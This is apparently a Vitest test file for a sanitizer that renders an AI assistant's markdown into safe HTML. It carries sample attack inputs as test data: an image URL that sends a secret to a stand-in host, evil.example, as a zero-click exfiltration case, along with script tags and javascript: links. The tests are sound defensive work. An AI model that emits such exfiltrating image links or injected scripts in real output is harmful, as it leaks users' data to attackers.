import { describe, it, expect } from 'vitest';
import { renderAssistantMarkdown } from '$lib/utils/assistantMarkdown';

describe('renderAssistantMarkdown', () => {
	it('renders basic markdown', () => {
		const html = renderAssistantMarkdown('Open **Compare**.\n\n1. Pick one\n2. Pick two');
		expect(html).toContain('<strong>Compare</strong>');
		expect(html).toContain('<ol>');
	});

	it('never renders images — markdown or raw HTML (zero-click exfiltration)', () => {
		const md = '![x](https://evil.example/leak?d=secret) <img src="https://evil.example/p.gif">';
		const html = renderAssistantMarkdown(md);
		expect(html).not.toContain('<img');
		expect(html).not.toContain('evil.example/p.gif');
	});

	it('strips scripts, iframes, forms, styles and inline style attributes', () => {
		const md =
			'<script>alert(1)</script><iframe src="https://x"></iframe><form action="https://x"><input></form><style>p{}</style><p style="color:red">hi</p>';
		const html = renderAssistantMarkdown(md);
		for (const bad of ['<script', '<iframe', '<form', '<input', '<style', 'style=']) {
			expect(html).not.toContain(bad);
		}
		expect(html).toContain('hi');
	});

	it('keeps http(s) links, opening safely in a new tab, and drops javascript: links', () => {
		const html = renderAssistantMarkdown('[docs](https://example.com) and [bad](javascript:alert(1))');
		expect(html).toContain('href="https://example.com"');
		expect(html).toContain('target="_blank"');
		expect(html).toContain('rel="noopener noreferrer"');
		expect(html).not.toContain('javascript:');
	});

	it('renders [area.task] citations as chips', () => {
		const html = renderAssistantMarkdown('Open **Compare** [compare.pick-two].');
		expect(html).toContain('data-cite="compare.pick-two"');
		expect(html).toContain('class="assistant-cite"');
	});

	it('does not treat arbitrary brackets as citations', () => {
		const html = renderAssistantMarkdown('Use [Not A Cite] or [x]');
		expect(html).not.toContain('data-cite');
	});
});
